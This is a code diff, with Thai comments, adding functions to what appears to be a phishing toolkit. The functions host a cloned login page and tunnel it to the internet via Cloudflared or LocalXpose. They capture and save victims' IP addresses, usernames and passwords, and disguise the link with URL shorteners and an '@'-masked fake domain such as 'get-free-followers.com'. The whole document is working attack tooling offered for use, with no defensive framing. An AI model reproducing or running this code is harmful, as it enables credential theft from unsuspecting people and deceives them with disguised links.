@@ -430,3 +430,259 @@ setup_site() {
         echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
         cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
 }
+
+
+## Get IP address
+capture_ip() {
+        # อ่านข้อมูลที่อยู่ IP จากไฟล์ .server/www/ip.txt
+        IP=$(awk -F'IP: ' '{print $2}' .server/www/ip.txt | xargs)
+        IFS=$'\n'
+        # แสดงที่อยู่ IP ของผู้ใช้ที่เข้ามา
+        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Victim's IP : ${BLUE}$IP"
+        # แสดงตำแหน่งที่เก็บไฟล์ IP
+        echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/ip.txt"
+        # บันทึกที่อยู่ IP ลงในไฟล์ auth/ip.txt
+        cat .server/www/ip.txt >> auth/ip.txt
+}
+
+## Get credentials
+capture_creds() {
+        # อ่านชื่อผู้ใช้ (Username) จากไฟล์ .server/www/usernames.txt
+        ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | awk '{print $2}')
+        # อ่านรหัสผ่าน (Password) จากไฟล์ .server/www/usernames.txt
+        PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | awk -F ":." '{print $NF}')
+        IFS=$'\n'
+        # แสดงชื่อผู้ใช้และรหัสผ่าน
+        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Account : ${BLUE}$ACCOUNT"
+        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Password : ${BLUE}$PASSWORD"
+        # แสดงตำแหน่งที่เก็บข้อมูล
+        echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/usernames.dat"
+        # บันทึกข้อมูลชื่อผู้ใช้และรหัสผ่านลงในไฟล์ auth/usernames.dat
+        cat .server/www/usernames.txt >> auth/usernames.dat
+        # แจ้งเตือนเพื่อรอข้อมูลการเข้าสู่ระบบถัดไป
+        echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
+}
+
+## Print data
+capture_data() {
+        # แสดงข้อความแจ้งเตือนว่ารอข้อมูลการเข้าสู่ระบบ
+        echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
+        # ใช้ลูปเพื่อรอข้อมูลที่ถูกสร้างขึ้น
+        while true; do
+                # ตรวจสอบว่ามีไฟล์ .server/www/ip.txt ถูกสร้างขึ้นหรือไม่
+                if [[ -e ".server/www/ip.txt" ]]; then
+                        echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
+                        # เรียกใช้ฟังก์ชัน capture_ip เพื่อจัดการข้อมูล IP
+                        capture_ip
+                        # ลบไฟล์ .server/www/ip.txt หลังจากใช้งานเสร็จ
+                        rm -rf .server/www/ip.txt
+                fi
+                # หยุดพักเล็กน้อยก่อนตรวจสอบรอบถัดไป
+                sleep 0.75
+                # ตรวจสอบว่ามีไฟล์ .server/www/usernames.txt ถูกสร้างขึ้นหรือไม่
+                if [[ -e ".server/www/usernames.txt" ]]; then
+                        echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Login info Found !!"
+                        # เรียกใช้ฟังก์ชัน capture_creds เพื่อจัดการข้อมูลชื่อผู้ใช้และรหัสผ่าน
+                        capture_creds
+                        # ลบไฟล์ .server/www/usernames.txt หลังจากใช้งานเสร็จ
+                        rm -rf .server/www/usernames.txt
+                fi
+                # หยุดพักเล็กน้อยก่อนตรวจสอบรอบถัดไป
+                sleep 0.75
+        done
+}
+
+
+## เริ่มต้นใช้งาน Cloudflared
+start_cloudflared() { 
+        # ลบไฟล์ log เก่าของ Cloudflared
+        rm .cld.log > /dev/null 2>&1 &
+        # เรียกใช้ฟังก์ชันกำหนดพอร์ต
+        cusport
+        # แสดงข้อความเริ่มต้นพร้อมลิงก์โฮสต์และพอร์ต
+        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+        # เรียกใช้ฟังก์ชันตั้งค่าเว็บไซต์
+        { sleep 1; setup_site; }
+        echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."
+
+        # ตรวจสอบว่ามีคำสั่ง termux-chroot หรือไม่ หากมีใช้เพื่อเรียกใช้งาน Cloudflared
+        if [[ `command -v termux-chroot` ]]; then
+                sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
+        else
+                sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
+        fi
+
+        # รอให้ Cloudflared ทำงานเสร็จ
+        sleep 8
+        # ดึง URL ที่ได้จาก Cloudflared
+        cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".server/.cld.log")
+        # เรียกใช้ฟังก์ชันสำหรับ URL ที่กำหนดเอง
+        custom_url "$cldflr_url"
+        # เรียกใช้ฟังก์ชันจัดการข้อมูล
+        capture_data
+}
+
+## ฟังก์ชันตรวจสอบการรับรอง LocalXpose
+localxpose_auth() {
+        # ตรวจสอบว่า LocalXpose มีคำสั่งให้ใช้งานหรือไม่
+        ./.server/loclx -help > /dev/null 2>&1 &
+        sleep 1
+        # กำหนดตำแหน่งไฟล์ token สำหรับ LocalXpose
+        [ -d ".localxpose" ] && auth_f=".localxpose/.access" || auth_f="$HOME/.localxpose/.access" 
+
+        # ตรวจสอบสถานะบัญชี LocalXpose หากพบข้อผิดพลาดให้แจ้งให้ผู้ใช้สร้างบัญชี
+        [ "$(./.server/loclx account status | grep Error)" ] && {
+                echo -e "\n\n${RED}[${WHITE}!${RED}]${GREEN} Create an account on ${ORANGE}localxpose.io${GREEN} & copy the token\n"
+                sleep 3
+                read -p "${RED}[${WHITE}-${RED}]${ORANGE} Input Loclx Token :${ORANGE} " loclx_token
+                [[ $loclx_token == "" ]] && {
+                        # แจ้งเตือนหากผู้ใช้ไม่ได้ใส่ token
+                        echo -e "\n${RED}[${WHITE}!${RED}]${RED} You have to input Localxpose Token." ; sleep 2 ; tunnel_menu
+                } || {
+                        # บันทึก token ลงในไฟล์
+                        echo -n "$loclx_token" > $auth_f 2> /dev/null
+                }
+        }
+}
+
+## เริ่มต้นใช้งาน LocalXpose
+start_loclx() {
+        # เรียกใช้ฟังก์ชันกำหนดพอร์ต
+        cusport
+        # แสดงข้อความเริ่มต้นพร้อมลิงก์โฮสต์และพอร์ต
+        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+        { sleep 1; setup_site; localxpose_auth; }
+        echo -e "\n"
+        # ให้ผู้ใช้เลือกว่าเปลี่ยนตำแหน่ง Region ของ LocalXpose หรือไม่
+        read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Change Loclx Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
+        [[ ${opinion,,} == "y" ]] && loclx_region="eu" || loclx_region="us"
+        # แสดงข้อความว่า LocalXpose กำลังเริ่มทำงาน
+        echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching LocalXpose..."
+
+        # ตรวจสอบว่ามีคำสั่ง termux-chroot หรือไม่ หากมีให้ใช้กับ LocalXpose
+        if [[ `command -v termux-chroot` ]]; then
+                sleep 1 && termux-chroot ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
+        else
+                sleep 1 && ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
+        fi
+
+        # รอให้ LocalXpose ทำงานเสร็จ
+        sleep 12
+        # ดึง URL ที่ได้จาก LocalXpose
+        loclx_url=$(cat .server/.loclx | grep -o '[0-9a-zA-Z.]*.loclx.io')
+        # เรียกใช้ฟังก์ชันสำหรับ URL ที่กำหนดเอง
+        custom_url "$loclx_url"
+        # เรียกใช้ฟังก์ชันจัดการข้อมูล
+        capture_data
+}
+
+## เริ่มต้นใช้งาน localhost
+start_localhost() {
+        # เรียกใช้ฟังก์ชันกำหนดพอร์ต
+        cusport
+        # แสดงข้อความเริ่มต้นพร้อมลิงก์โฮสต์และพอร์ต
+        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+        # เรียกใช้ฟังก์ชันตั้งค่าเว็บไซต์
+        setup_site
+        { sleep 1; clear; banner_small; }
+        # แสดงข้อความว่า localhost พร้อมใช้งาน
+        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Successfully Hosted at : ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
+        # เรียกใช้ฟังก์ชันจัดการข้อมูล
+        capture_data
+}
+
+
+## เมนูเลือกประเภท Tunnel
+tunnel_menu() {
+        # ล้างหน้าจอและแสดงแบนเนอร์เล็ก
+        { clear; banner_small; }
+        cat <<- EOF
+
+                ${RED}[${WHITE}01${RED}]${ORANGE} Localhost
+                ${RED}[${WHITE}02${RED}]${ORANGE} Cloudflared  ${RED}[${CYAN}Auto Detects${RED}]
+                ${RED}[${WHITE}03${RED}]${ORANGE} LocalXpose   ${RED}[${CYAN}NEW! Max 15Min${RED}]
+
+        EOF
+
+        # รับอินพุตจากผู้ใช้
+        read -p "${RED}[${WHITE}-${RED}]${GREEN} Select a port forwarding service : ${BLUE}"
+
+        # ตรวจสอบเงื่อนไขของอินพุตและเรียกใช้ฟังก์ชันตามที่เลือก
+        case $REPLY in 
+                1 | 01)
+                        start_localhost;; # เรียกใช้ localhost
+                2 | 02)
+                        start_cloudflared;; # เรียกใช้ Cloudflared
+                3 | 03)
+                        start_loclx;; # เรียกใช้ LocalXpose
+                *)
+                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+                        { sleep 1; tunnel_menu; };; # แจ้งข้อผิดพลาดและเรียกเมนูอีกครั้ง
+        esac
+}
+
+## ตั้งค่า Mask URL ที่กำหนดเอง
+custom_mask() {
+        # ล้างหน้าจอและแสดงแบนเนอร์เล็ก
+        { sleep .5; clear; banner_small; echo; }
+        # ให้ผู้ใช้เลือกว่าจะเปลี่ยน Mask URL หรือไม่
+        read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do you want to change Mask URL? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}] :${ORANGE} " mask_op
+        echo
+        if [[ ${mask_op,,} == "y" ]]; then
+                echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Enter your custom URL below ${CYAN}(${ORANGE}Example: https://get-free-followers.com${CYAN})\n"
+                read -e -p "${WHITE} ==> ${ORANGE}" -i "https://" mask_url # รับ URL ที่ต้องการใช้
+                # ตรวจสอบความถูกต้องของ URL
+                if [[ ${mask_url//:*} =~ ^([h][t][t][p][s]?)$ || ${mask_url::3} == "www" ]] && [[ ${mask_url#http*//} =~ ^[^,~!@%:\=\#\;\^\*\"\'\|\?+\<\>\{\}\\/]+$ ]]; then
+                        mask=$mask_url
+                        echo -e "\n${RED}[${WHITE}-${RED}]${CYAN} Using custom Masked Url :${GREEN} $mask"
+                else
+                        echo -e "\n${RED}[${WHITE}!${RED}]${ORANGE} Invalid url type..Using the Default one.."
+                fi
+        fi
+}
+
+## ย่อ URL ให้สั้นลง
+site_stat() { [[ ${1} != "" ]] && curl -s -o "/dev/null" -w "%{http_code}" "${1}https://github.com"; }
+
+shorten() {
+        # ใช้ API เพื่อย่อ URL
+        short=$(curl --silent --insecure --fail --retry-connrefused --retry 2 --retry-delay 2 "$1$2")
+        if [[ "$1" == *"shrtco.de"* ]]; then
+                processed_url=$(echo ${short} | sed 's/\\//g' | grep -o '"short_link2":"[a-zA-Z0-9./-]*' | awk -F\" '{print $4}')
+        else
+                processed_url=${short#http*//}
+        fi
+}
+
+custom_url() {
+        # ตั้งค่า URL เบื้องต้น
+        url=${1#http*//}
+        isgd="https://is.gd/create.php?format=simple&url="
+        shortcode="https://api.shrtco.de/v2/shorten?url="
+        tinyurl="https://tinyurl.com/api-create.php?url="
+
+        { custom_mask; sleep 1; clear; banner_small; }
+        # ตรวจสอบว่า URL เป็นประเภทที่รองรับหรือไม่
+        if [[ ${url} =~ [-a-zA-Z0-9.]*(trycloudflare.com|loclx.io) ]]; then
+                if [[ $(site_stat $isgd) == 2* ]]; then
+                        shorten $isgd "$url"
+                elif [[ $(site_stat $shortcode) == 2* ]]; then
+                        shorten $shortcode "$url"
+                else
+                        shorten $tinyurl "$url"
+                fi
+
+                url="https://$url"
+                masked_url="$mask@$processed_url"
+                processed_url="https://$processed_url"
+        else
+                # กรณีไม่สามารถสร้าง URL ได้
+                url="Unable to generate links. Try after turning on hotspot"
+                processed_url="Unable to Short URL"
+        fi
+
+        # แสดงผลลัพธ์
+        echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$url"
+        echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${ORANGE}$processed_url"
+        [[ $processed_url != *"Unable"* ]] && echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 3 : ${ORANGE}$masked_url"
+}
